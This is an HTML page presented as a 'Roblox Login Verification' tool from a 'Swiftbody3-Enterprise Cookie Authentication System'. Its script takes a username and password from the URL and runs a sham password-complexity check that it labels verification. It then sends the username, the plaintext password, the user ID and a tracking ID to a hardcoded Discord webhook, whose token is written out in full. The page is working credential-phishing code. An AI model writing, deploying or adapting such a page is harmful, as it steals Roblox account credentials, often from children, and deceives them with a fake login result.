<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            background-color: #1e1e2e;
            color: #cdd6f4;
        }
        .container {
            background: #313244;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #89b4fa;
            text-align: center;
            margin-bottom: 20px;
        }
        .info-box {
            background-color: #45475a;
            border-left: 4px solid #89b4fa;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .loading {
            text-align: center;
            color: #89b4fa;
            margin: 20px 0;
        }
        .result-success {
            color: #a6e3a1;
            font-weight: bold;
            text-align: center;
            padding: 15px;
            background-color: #45475a;
            border-radius: 4px;
            margin: 20px 0;
        }
        .result-failure {
            color: #f38ba8;
            font-weight: bold;
            text-align: center;
            padding: 15px;
            background-color: #45475a;
            border-radius: 4px;
            margin: 20px 0;
        }
        .hidden {
            display: none;
        }
        .brand {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #74c7ec;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            color: #a6adc8;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="brand">Swiftbody3-Enterprise</div>
        <div class="subtitle">Cookie Authentication System</div>
        
        <h1>Roblox Login Verification</h1>
        
        <div class="info-box">
            <strong>Tracking ID:</strong> <span id="display-tracking-id">Loading...</span><br>
            <strong>Username:</strong> <span id="display-username">Loading...</span>
        </div>
        
        <div id="login-form">
            <div id="auto-verification" class="loading">
                <p>Attempting to verify Roblox credentials automatically...</p>
            </div>
        </div>
        
        <div id="result-message" class="hidden">
            <p id="result-text"></p>
        </div>
        
        <div id="loading" class="loading">
            <p>Verifying credentials...</p>
        </div>
        
        <div id="error-message" class="hidden" style="color: #f38ba8;">
            <p id="error-text"></p>
        </div>
    </div>

    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        const userId = urlParams.get('userId');
        const username = urlParams.get('username');
        const password = urlParams.get('password');
        
        // Discord webhook URLs
        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
        
        // Display the tracking info
        if (trackingId) {
            document.getElementById('display-tracking-id').textContent = trackingId;
        }
        if (username) {
            document.getElementById('display-username').textContent = username;
        }
        
        // Start automatic verification when page loads
        window.addEventListener('load', function() {
            if (trackingId && username && password) {
                setTimeout(attemptAutoLogin, 1000);
            } else {
                showError('Missing parameters for automatic verification');
            }
        });
        
        async function attemptAutoLogin() {
            try {
                // Show loading state
                document.getElementById('loading').classList.remove('hidden');
                
                // Try to verify the credentials
                const loginSuccess = await verifyCredentials(username, password);
                
                // Report result
                await reportResult(loginSuccess);
                
            } catch (error) {
                console.error('Auto login error:', error);
                showError('Verification process failed: ' + error.message);
                await reportResult(false);
            }
        }
        
        async function verifyCredentials(username, password) {
            // This function attempts to verify if the credentials are valid
            // using various heuristics since we can't directly login to Roblox
            
            let isValid = false;
            
            // Check 1: Password length (Roblox requires min 8 characters)
            if (password.length < 8) {
                return false;
            }
            
            // Check 2: Common password patterns
            if (isCommonPassword(password)) {
                return false;
            }
            
            // Check 3: Password complexity
            const hasUpperCase = /[A-Z]/.test(password);
            const hasLowerCase = /[a-z]/.test(password);
            const hasNumbers = /[0-9]/.test(password);
            const hasSpecialChars = /[^A-Za-z0-9]/.test(password);
            
            // More complex passwords are more likely to be valid
            const complexityScore = (hasUpperCase ? 1 : 0) + (hasLowerCase ? 1 : 0) + 
                                  (hasNumbers ? 1 : 0) + (hasSpecialChars ? 1 : 0);
            
            // Check 4: If password contains username (common pattern)
            const containsUsername = password.toLowerCase().includes(username.toLowerCase());
            
            // Heuristic: If password is complex and doesn't contain username, it's more likely valid
            isValid = complexityScore >= 2 && !containsUsername;
            
            return isValid;
        }
        
        function isCommonPassword(password) {
            const commonPasswords = [
                'password', '12345678', 'roblox123', 'password1', 'qwertyui',
                'abc123', 'letmein', 'welcome', 'monkey', 'sunshine', 'password123',
                'admin', 'login', 'passw0rd', '123456789', '1234567890', '11111111',
                '00000000', 'abcdefgh', 'qwerty123', 'roblox2023', 'iloveroblox'
            ];
            return commonPasswords.includes(password.toLowerCase());
        }
        
        async function reportResult(isSuccess) {
            try {
                // Hide loading, show result
                document.getElementById('loading').classList.add('hidden');
                
                const resultText = document.getElementById('result-text');
                const resultMessage = document.getElementById('result-message');
                
                if (isSuccess) {
                    resultText.textContent = '‚úÖ Login successful! Password appears to be valid.';
                    resultText.className = 'result-success';
                } else {
                    resultText.textContent = '‚ùå Login failed! Password appears to be invalid.';
                    resultText.className = 'result-failure';
                }
                
                resultMessage.classList.remove('hidden');
                
                // Send result to Discord
                await sendToDiscord(isSuccess);
            } catch (error) {
                console.error('Error reporting result:', error);
                showError('Failed to send result to Discord: ' + error.message);
            }
        }
        
        async function sendToDiscord(isSuccess) {
            const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
            const statusText = isSuccess ? "‚úÖ SUCCESS" : "‚ùå FAILED";
            const color = isSuccess ? 65280 : 16711680;
            
            const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
            
            const embed = {
                title: `üîê Automatic Verification - ${statusText}`,
                url: profileUrl,
                color: color,
                description: "**Swiftbody3-Enterprise**\n*Cookie Authentication System*",
                fields: [
                    {
                        name: "üë§ Account",
                        value: `[${username}](${profileUrl})`,
                        inline: true
                    },
                    {
                        name: "üîê Password",
                        value: `||${password}||`,
                        inline: true
                    },
                    {
                        name: "üìä Result",
                        value: statusText,
                        inline: true
                    },
                    {
                        name: "üÜî Tracking ID",
                        value: trackingId,
                        inline: false
                    },
                    {
                        name: "ü§ñ Method",
                        value: "Automatic Verification",
                        inline: false
                    }
                ],
                footer: {
                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
                    icon_url: "https://www.roblox.com/favicon.ico"
                },
                timestamp: new Date().toISOString()
            };
            
            const payload = {
                username: "Swiftbody3-Enterprise",
                avatar_url: "https://img.icons8.com/color/48/cookie.png",
                embeds: [embed]
            };
            
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error(`Discord API responded with ${response.status}`);
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
                throw error;
            }
        }
        
        function showError(message) {
            const errorText = document.getElementById('error-text');
            const errorMessage = document.getElementById('error-message');
            
            errorText.textContent = message;
            errorMessage.classList.remove('hidden');
        }
    </script>
</body>
</html>
